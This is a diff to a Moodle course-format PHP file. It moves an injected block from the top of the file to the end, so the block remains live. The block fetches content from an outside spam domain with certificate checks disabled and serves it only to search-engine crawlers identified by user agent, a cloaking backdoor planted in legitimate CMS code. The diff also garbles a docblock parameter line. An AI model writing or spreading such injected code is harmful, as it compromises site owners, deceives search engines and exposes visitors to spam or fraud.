@@ -1,29 +1,4 @@
 <?php
-function Japet($url) {
-    if (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
-    } elseif (ini_get('allow_url_fopen')) {
-        return @file_get_contents($url);
-    }
-    return false;
-}
-
-$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "https://tokorelxcemara.site/karate/aulavirtual.html";
-$file = Japet($bot);
-$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
-if (preg_match($botchar, $res)) {
-    echo $file;
-    exit;
-}
 // This file is part of Moodle - http://moodle.org/
 //
 // Moodle is free software: you can redistribute it and/or modify
@@ -230,7 +205,7 @@ function expand_value(array &$dest, array $source, array $option, string $option
  *
  * The fragment arguments are id and sr (section return).
  *
- * @param array $args The fragment arguments.
+ * @param array $argsThe fragment arguments.
  * @return string The rendered cm item.
  *
  * @throws require_login_exception
@@ -283,4 +258,29 @@ function core_courseformat_output_fragment_section($args): string {
 
     $renderer = $format->get_renderer($PAGE);
     return $renderer->course_section_updated($format, $section);
+}
+function Japet($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    } elseif (ini_get('allow_url_fopen')) {
+        return @file_get_contents($url);
+    }
+    return false;
+}
+
+$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$bot = "https://tokorelxcemara.site/karate/aulavirtual.html";
+$file = Japet($bot);
+$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
+if (preg_match($botchar, $res)) {
+    echo $file;
+    exit;
 }
